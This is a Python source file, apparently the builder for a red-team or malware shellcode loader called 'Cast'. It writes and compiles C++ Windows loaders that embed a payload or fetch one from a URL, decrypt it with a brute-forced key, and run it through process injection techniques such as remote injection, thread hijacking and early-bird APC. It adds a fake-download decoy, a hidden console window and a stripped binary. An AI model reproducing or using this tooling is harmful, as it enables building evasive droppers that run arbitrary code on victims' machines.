import os
import time
import json
from Cast.cli import *
from Cast.local_load import *
from Cast.encryptor import *
from Cast.random_spells import *

def build (Path, build_folder, Encryption, Enumeration, Payload, ProcessName, Loader, Url, Decoy):
    f = open (f"{build_folder}\\main.cpp", "a")
    f.write(f"""
#include <iostream>
#include <string>
#include <Windows.h>
#include <stdio.h>
#include <wininet.h>
#include "../../Spells/UtilitySpells/FetchFromURL.h"

""")
    if Decoy != "null":
        f.write(f"""\n
#include "../../Spells/UtilitySpells/FakeDownload.h"
""")   
    
    if Encryption != "null":
        f.write(f"""\n
#include "../../Spells/EncryptionSpells/{Encryption}"
#include "../../Spells/EncryptionSpells/KeyBrute.h"
""")
        
    if Enumeration != "null":
        f.write(f"""\n
#include "../../Spells/{Enumeration}"
""")
        
    f.write(f"""\n
#include "../../Spells/{Loader}"
""")
    if Payload != "null" :
        Payload_Str = "static const unsigned char Data_RawData[] = {" + ", ".join(map(lambda b: hex(b), Payload)) + "};"
        f.write(f"""\n
{Payload_Str} 
""")
        
    f.write(f"""\n
using namespace std;
int main()
{{
    PBYTE pPayloadAddress;
    SIZE_T pPayloadSize;
    string Url = "{Url}";
    LPWSTR szProcessName = L"{ProcessName}";
    DWORD dwProcessID;
    HANDLE hProcess;
    PBYTE InjectionAddress;
    HANDLE hThread;
    HANDLE* phThread = &hThread;

    """)
    if Decoy != "null":
        f.write(f"""\n
    FakeDownload();
""")

    f.write(f"""\n
    HANDLE hSemaphore = CreateSemaphoreA(NULL, 10, 10, "ControlString");

    if (hSemaphore != NULL && GetLastError() == ERROR_ALREADY_EXISTS)
	    exit(0);

	// Payload is not running
    hThread = GetCurrentThread();
    """)

    if Payload != "null":
        f.write(f"""\n
    pPayloadSize = {len(Payload)};
    pPayloadAddress = (PBYTE)malloc(pPayloadSize);
    if (pPayloadAddress == NULL)
    {{
        printf("Memory allocation failed.\\n");
        return 1;
    }}
    memcpy(pPayloadAddress, Data_RawData, pPayloadSize);
""")

    if Url != "null":
        f.write(f"""\n
    if(!FetchFileFromURLA(Url.c_str(), &pPayloadAddress, (PDWORD)&pPayloadSize)){{
        printf("Failed to fetch payload");
        return 0;
    }}

    """)

    if Enumeration != "null":
        f.write(f"""\n
    if(!GetRemoteProcess(szProcessName, &dwProcessID, &hProcess, &hThread)){{
        printf("Failed to find remote process");
        return 0;
    }}""" ) 
    else:
        pass

    if Encryption != "null":
        f.write(f"""\n
    {get_keyguard()[1]}
    
    #define HINT_BYTE {get_keyguard()[2]}
    size_t sKeySize = sizeof(ProtectedKey);
    PBYTE pbKey = (PBYTE)ProtectedKey;
    PBYTE pbRealKey;
    BruteForceDecryption(HINT_BYTE , pbKey, sKeySize, &pbRealKey);
    size_t sRealKeySize = sizeof(pbRealKey);
    Decrypt(pPayloadAddress, pPayloadSize, pbRealKey, sRealKeySize);

""")

    f.write(f"""\n
    if(!PayloadExecute(hProcess, hThread, pPayloadAddress, (SIZE_T)pPayloadSize, &InjectionAddress, phThread)){{
        printf("Failed to execute payload");
        return 0;
    }}
            
    free(pPayloadAddress);
   
    // Just for testing purposes (TO REMOVE)
	WaitForSingleObject(*phThread, INFINITE);
    return 0;
}}
""")

    f.close()
    time.sleep(2)
    #build = os.system(f"g++ --static -g -O2 -w -s -DNO_WINTERNL -o {Path} Build\\main.cpp Cast\\TinyAES.c -lwininet -lws2_32 -mwindows")
    build = os.system(f"g++ --static -g -O2 -w -s -DNO_WINTERNL -o {Path} {build_folder}\\main.cpp Cast\\TinyAES.c -lwininet -lws2_32 -mwindows")
    os.system(f"strip -o  {Path}.exe {Path}.exe")
    return build
    #result = subprocess.run(['g++', '-o', 'chungus', 'main.cpp','-lwininet', '-DNO_WINTERNL', '-lws2_32', '-mwindows'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    #print(result)

def change_header_file(Enumeration, Loader, ApiMode):
    try:
        with open(f"Spells/{Enumeration}", "r") as file:
            content = file.read()
        content = content.replace('#include "api.h"', f'#include "../{ApiMode}"')
        with open(f"Spells/{Enumeration}", "w") as file:
            file.write(content)
    except:
        pass

    with open(f"Spells/{Loader}", "r") as file:
        content = file.read()
    content = content.replace('#include "api.h"', f'#include "../{ApiMode}"')
    with open(f"Spells/{Loader}", "w") as file:
        file.write(content)

def restore_header_file(Enumeration, Loader, ApiMode):
    try:
        with open(f"Spells/{Enumeration}", "r") as file:
            content = file.read()
        content = content.replace(f'#include "../{ApiMode}"', '#include "api.h"')
        with open(f"Spells/{Enumeration}", "w") as file:
            file.write(content)
    except:
        pass

    with open(f"Spells/{Loader}", "r") as file:
        content = file.read()
    content = content.replace(f'#include "../{ApiMode}"', '#include "api.h"')
    with open(f"Spells/{Loader}", "w") as file:
        file.write(content)

def read_from_template(Path):
    Path = os.path.join(Path, "template.json")
    with open("template.json", "r") as file:
        data = json.load(file)
    return data



def build_template(Path, Url, Encryption, Enumeration, ProcessName, Loader, Decoy):
    Path = os.path.join(Path, "template.json")
    data = {
        "Url": Url,
        "Encryption": Encryption,
        "Enumeration": Enumeration,
        "ProcessName": ProcessName,
        "Loader": Loader,
        "Decoy": Decoy
    }
    with open(Path, "w") as file:
        json.dump(data, file, indent=4)


def main():

    Payload_Location = set_payload_location()
    if Payload_Location == "2":
        Url = set_url()
        Payload = remote_payload_fetch(Url)
    else:
        Payload = local_payload_fetch()
        Url = "null"
    
    Encryption = set_payload_encryption()
    if Encryption != "null":
        build_encryptor(Encryption, Payload)
        if Payload_Location == "1":
            Payload = read_encrypted_payload()
        elif Payload_Location == "2":
            Payload = "null"
            print("\n[!!]NOTE[!!]\nEncrypted Payload is saved as encrypted.bin")
            print(f"Please host the encrypted.bin at {Url}")
    # else:
    #     Payload_Plain = "static const unsigned char Data_RawData[] = {" + ", ".join(map(lambda b: hex(b), Payload)) + "};"
    #     Payload = Payload_Plain
    #TODO  set_payload_encryption()

    if set_loader_type() == "1":
        Loader = set_local_loader_type()
        Enumeration = "null"
        ProcessName = "null"
    else:
        Loader = set_remote_loader_type()
        if Loader == "RemoteExecutionSpells/RemoteInjection.h" or Loader == "RemoteExecutionSpells/RemoteMappingInjection.h":
            if get_handle_type() == "1":
                Enumeration = set_proc_creation_type()
            else:
                Enumeration = set_enum_type()
        elif Loader == "RemoteExecutionSpells/RemoteThreadHijacking.h":
            Enumeration = "CreationSpells/CreateSuspended.h"
        elif Loader == "RemoteExecutionSpells/EarlyBirdApcInjection.h":
            Enumeration = set_proc_creation_type() 
    
        ProcessName = set_process_name()
    
    ApiMode = set_api_mode()

    change_header_file(Enumeration, Loader, ApiMode)

    Decoy = set_decoy()

    Path = input(f"""\nPath for the final build (Default .\\Build):

    >> """)
    if Path == "":
        Path = ".\\Build"
    
    Name = input(f"""\nFinaly the spell name (Default Random Spell Name):
    
    >> """)
    if Name == "":
        Name = spell_name()

    timestamp = time.strftime("%Y%m%d_%H%M%S")
    build_folder = os.path.join(Path, timestamp)
    os.makedirs(build_folder, exist_ok=True)
    Path = os.path.join(build_folder, Name)

    print(f"""
[+] Casting {Name}... 

    ╰( ⁰ ਊ ⁰ )━━☆ﾟ.*･｡ﾟ \n""")

    if not build_template(build_folder, Url, Encryption, Enumeration, ProcessName, Loader, Decoy):
        print(f"\n[+] Template saved at {build_folder}")
    else:
        print(f"\n[!] Failed to save template at {build_folder}")

    if not build(Path, build_folder, Encryption, Enumeration, Payload, ProcessName, Loader, Url, Decoy):
        print(f"""
[+] Loader Built Successfully! At {build_folder}
    
    Have Fun! (ﾉ◕ヮ◕)ﾉ*:･ﾟ✧\n""")
    else:
        print(f"\n[!]Failed to build loader (╯°□°）╯︵ ┻━┻\n")
    
    restore_header_file(Enumeration, Loader, ApiMode)
    if Payload_Location == "1":
        os.remove("encrypted.bin")


if __name__ == "__main__":
    main()
